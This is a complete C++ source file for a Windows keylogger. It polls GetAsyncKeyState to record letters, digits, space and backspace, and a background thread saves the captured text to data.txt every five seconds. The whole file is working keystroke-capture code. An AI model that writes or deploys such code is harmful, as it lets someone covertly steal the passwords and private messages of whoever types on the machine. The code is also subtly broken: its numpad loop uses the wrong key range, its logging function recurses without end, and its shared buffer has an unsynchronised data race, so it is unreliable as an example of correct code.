#include <iostream>
#include <windows.h>
#include <fstream>
#include <thread>

using namespace std;

void task(string* msg)
{
    std::this_thread::sleep_for(std::chrono::seconds(5));
    ofstream myfile;
    myfile.open("data.txt");
    if(myfile.is_open())
    {
        myfile << *msg;
        myfile.close();
        cout << "Saved log" << endl;
    }
    else cout << "Error" << endl;
    
    task(msg);
}

int main ()
{
    int shift = 0;
    string MSG = "";
    std::thread bt(task, &MSG);
    while(true)
    {
        shift = 0;
        if(GetAsyncKeyState(VK_SHIFT))
        {
            shift = 26;
        }
        for(int n = 65; n < 65 + 26; n++)
        {
            SHORT msg;
            if(msg = GetAsyncKeyState(n) & 0x0001)
            {
                int n1 = n - 65;
                char msgout = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"[n1 + shift];
                MSG = MSG + msgout;
                Sleep(10);
            }
        }
        for(int n = 48; n < 48 + 10; n++)
        {
            SHORT msg;
            if(msg = GetAsyncKeyState(n) & 0x0001)
            {
                int n1 = n - 48;
                char msgout = "0123456789"[n1];
                MSG = MSG + msgout;
                Sleep(10);
            }
        }
        for(int n = 91; n < 91 + 10; n++)
        {
            SHORT msg;
            if(msg = GetAsyncKeyState(n) & 0x0001)
            {
                int n1 = n - 91;
                char msgout = "0123456789"[n1];
                MSG = MSG + msgout;
                Sleep(10);
            }
        }
        if(GetAsyncKeyState(VK_SPACE) & 0x0001)
        {
            MSG = MSG + " "[0];
        }
        else if(GetAsyncKeyState(VK_BACK) & 0x0001)
        {
            MSG = MSG.substr(0, MSG.size() - 1);
        }
    }
    return 0;
}